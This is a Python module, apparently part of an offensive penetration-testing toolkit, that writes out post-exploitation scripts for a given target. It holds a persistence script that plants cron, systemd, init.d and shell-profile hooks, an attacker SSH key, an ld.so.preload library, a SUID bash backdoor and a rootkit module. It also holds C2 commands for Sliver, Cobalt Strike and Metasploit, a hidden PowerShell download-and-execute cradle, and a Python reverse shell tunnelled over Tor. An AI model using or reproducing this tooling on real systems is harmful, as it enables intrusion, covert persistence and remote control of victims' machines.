"""
Post-Exploitation Module
Handles post-exploitation and C2 functionality
"""

import sys
from pathlib import Path

# Add configs directory to path for config import
TOOLKIT_DIR = Path(__file__).parent.parent.parent.absolute()
sys.path.insert(0, str(TOOLKIT_DIR / "configs"))

try:
    import config
except ImportError:
    # Fallback config values if import fails
    class config:
        ATTACKER_DOMAIN = "localhost"
        ATTACKER_IP = "127.0.0.1"
        C2_SERVER_URL = "http://localhost:8080"
        C2_LISTENER_PORT = 8443
        TOR_ENABLED = False
        TOR_HIDDEN_SERVICE_PORT = 80
        SSH_PUBLIC_KEY = "ssh-rsa AAAAB3... Generate your own key"

from core.utils.output import print_colored

def run_post_exploitation(target: str, tool_executor, script_gen):
    """Execute post-exploitation, C2, and pivoting phase"""
    print_colored(f"üì° Running Post-Exploitation / C2 for: {target}", "GREEN", True)
    print()
    
    # Get config values
    attacker_ip = getattr(config, 'ATTACKER_IP', '127.0.0.1')
    c2_port = getattr(config, 'C2_LISTENER_PORT', 8443)
    tor_enabled = getattr(config, 'TOR_ENABLED', False)
    
    # C2 and pivoting tools
    c2_tools = {
        "chisel": {
            "server_command": ["chisel", "server", "--reverse", "--port", f"{c2_port}"],
            "client_command": ["chisel", "client", f"{attacker_ip}:{c2_port}", "R:1080:socks"],
            "description": "TCP tunnel for pivoting"
        },
        "socat": {
            "command": ["socat", "TCP-LISTEN:8081,fork", f"TCP:{target}:22"],
            "description": "Port forwarding relay"
        }
    }
    
    # Check for C2 frameworks
    c2_frameworks = ["sliver-server", "havoc", "metasploit", "empire"]
    
    print_colored("üåê C2 Framework Status:", "BLUE")
    for framework in c2_frameworks:
        if tool_executor.check_tool(framework):
            print_colored(f"‚úÖ {framework}: Available", "GREEN")
        else:
            print_colored(f"‚ùå {framework}: Not installed", "RED")
    
    print()
    
    # Check Tor status if enabled
    if tor_enabled:
        print_colored("üßÖ Tor Status:", "BLUE")
        tor_status = check_tor_status(tool_executor)
        
        if tor_status.get("running", False):
            print_colored("‚úÖ Tor service is running", "GREEN")
            print_colored(f"üîí Tor hidden service: {tor_status.get('onion_address', 'Unknown')}", "CYAN")
        else:
            print_colored("‚ùå Tor service not running", "RED")
            print_colored("‚ÑπÔ∏è Configure Tor in settings menu", "YELLOW")
    
    # Generate C2 deployment scripts
    generate_c2_scripts(target, script_gen)
    
    # Setup persistence
    print_colored("üîí Setting up persistence mechanisms...", "BLUE")
    
    # Get SSH key from config
    ssh_key = getattr(config, 'SSH_PUBLIC_KEY', '')
    
    script_gen.safe_write("persistence.sh", f"""#!/bin/bash
# Persistence script for {target}

# Add to crontab
echo "*/5 * * * * /tmp/.update > /dev/null 2>&1" | crontab -
echo "@reboot /tmp/.update > /dev/null 2>&1" | crontab -

# Systemd service
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.update
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable update.service
systemctl start update.service

# Init.d script
cat > /etc/init.d/update << EOF
#!/bin/bash
case "$1" in
    start)
        /tmp/.update &
        ;;
    stop)
        pkill -f .update
        ;;
    restart)
        \$0 stop
        \$0 start
        ;;
esac
EOF

chmod +x /etc/init.d/update
update-rc.d update defaults

# SSH key harvesting
mkdir -p ~/.ssh
echo "{ssh_key}" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Bash profile persistence
echo "/tmp/.update &" >> ~/.bashrc
echo "/tmp/.update &" >> ~/.profile

# LD_PRELOAD
echo "/lib/evil.so" >> /etc/ld.so.preload

# SUID backdoor
cp /bin/bash /tmp/.bash
chmod +s /tmp/.bash

# Kernel module persistence (advanced)
insmod /tmp/rootkit.ko
echo "/tmp/rootkit.ko" >> /etc/modules
""")
    print_colored("üìÅ Persistence script generated", "CYAN")
    
    # Return success
    return {
        "success": True,
        "tor_enabled": tor_enabled
    }

def check_tor_status(tool_executor):
    """Check Tor status and get onion address if available"""
    result = {"running": False, "onion_address": None}
    
    # Check if Tor is running
    tor_check = tool_executor.execute_tool(
        "systemctl",
        ["systemctl", "is-active", "tor"],
        timeout=10
    )
    
    if tor_check.get("success") and tor_check.get("output", "").strip() == "active":
        result["running"] = True
        
        # Try to get onion address from torrc
        torrc_path = Path("/etc/tor/torrc")
        hidden_service_dir = None
        
        try:
            if torrc_path.exists():
                with open(torrc_path, 'r') as f:
                    for line in f:
                        if line.startswith("HiddenServiceDir"):
                            hidden_service_dir = line.split()[1]
                            break
                            
                if hidden_service_dir:
                    hostname_path = Path(hidden_service_dir) / "hostname"
                    if hostname_path.exists():
                        with open(hostname_path, 'r') as f:
                            result["onion_address"] = f.read().strip()
        except Exception:
            pass
    
    return result

def generate_c2_scripts(target: str, script_gen):
    """Generate C2 deployment scripts"""
    # Get config values
    attacker_ip = getattr(config, 'ATTACKER_IP', '127.0.0.1')
    attacker_domain = getattr(config, 'ATTACKER_DOMAIN', 'localhost')
    c2_server_url = getattr(config, 'C2_SERVER_URL', f'http://{attacker_domain}')
    c2_port = getattr(config, 'C2_LISTENER_PORT', 8443)
    tor_enabled = getattr(config, 'TOR_ENABLED', False)
    tor_hidden_service = getattr(config, 'TOR_HIDDEN_SERVICE', 'your-onion-address.onion')
    
    # Sliver C2 script
    sliver_content = f"""# Sliver C2 Deployment for {target}

# Start Sliver server
sliver-server

# Generate implant
generate --mtls {attacker_ip}:{c2_port} --os windows --arch amd64 --format exe --save /tmp/implant.exe

# Start MTLS listener
mtls --lhost 0.0.0.0 --lport {c2_port}

# Generate HTTP implant
generate --http {c2_server_url} --os linux --arch amd64 --format elf --save /tmp/linux_implant

# Start HTTP listener
http --lhost 0.0.0.0 --lport 80
"""

    # Cobalt Strike script
    cs_content = f"""# Cobalt Strike Deployment for {target}

# Start team server
./teamserver {attacker_ip} password malleable_profile.txt

# Generate payloads
./cobaltstrike
# Use GUI to generate stageless payloads

# PowerShell cradle
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('{c2_server_url}/a'))"

# Malleable C2 profile example
set sample_name "Custom Profile";
set sleeptime "30000";
set jitter    "20";

http-get {{
    set uri "/search /news /about";
    client {{
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    }}
}}
"""

    # Metasploit C2 script
    msf_content = f"""# Metasploit Framework C2 for {target}

# Multi handler
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST {attacker_ip}
set LPORT {c2_port}
set HandlerSSLCert /path/to/cert.pem
exploit -j

# Web delivery
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set LHOST {attacker_ip}
set LPORT 4444
exploit

# PowerShell Empire commands
uselistener http
set Host {attacker_ip}
set Port 80
execute

usestager multi/launcher
set Listener http
execute
"""

    # Tor C2 script - NEW!
    tor_content = f"""# Tor Hidden Service C2 Configuration for {target}

# Tor Hidden Service Config (add to /etc/tor/torrc)
HiddenServiceDir /var/lib/tor/hidden_c2/
HiddenServicePort 80 127.0.0.1:8080
HiddenServicePort 443 127.0.0.1:8443
HiddenServicePort 8443 127.0.0.1:8443

# Restart Tor service
systemctl restart tor

# Wait for onion address generation
sleep 5
cat /var/lib/tor/hidden_c2/hostname

# Set up Socat port forwarding
socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80 &
socat TCP-LISTEN:8443,fork TCP:127.0.0.1:443 &

# Tor-enabled payload examples
# PowerShell (using Tor proxy)
powershell -exec bypass -c "$w=(New-Object Net.WebClient);$w.Proxy=New-Object Net.WebProxy('socks5://127.0.0.1:9050');IEX($w.DownloadString('{tor_hidden_service}/payload.ps1'))"

# Python Tor payload
python3 -c "import socks,socket,subprocess,os;s=socks.socksocket();s.set_proxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050);s.connect(('{tor_hidden_service.replace('http://', '').replace('https://', '')}',80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
"""

    # Write scripts
    script_gen.safe_write("sliver_c2.txt", sliver_content)
    script_gen.safe_write("cobaltstrike_c2.txt", cs_content)
    script_gen.safe_write("metasploit_c2.txt", msf_content)
    
    # Add Tor C2 script if enabled
    if tor_enabled:
        script_gen.safe_write("tor_c2.txt", tor_content)
        print_colored("üìÅ Tor C2 configuration generated", "CYAN")
    
    print_colored("üìÅ C2 deployment scripts generated", "CYAN")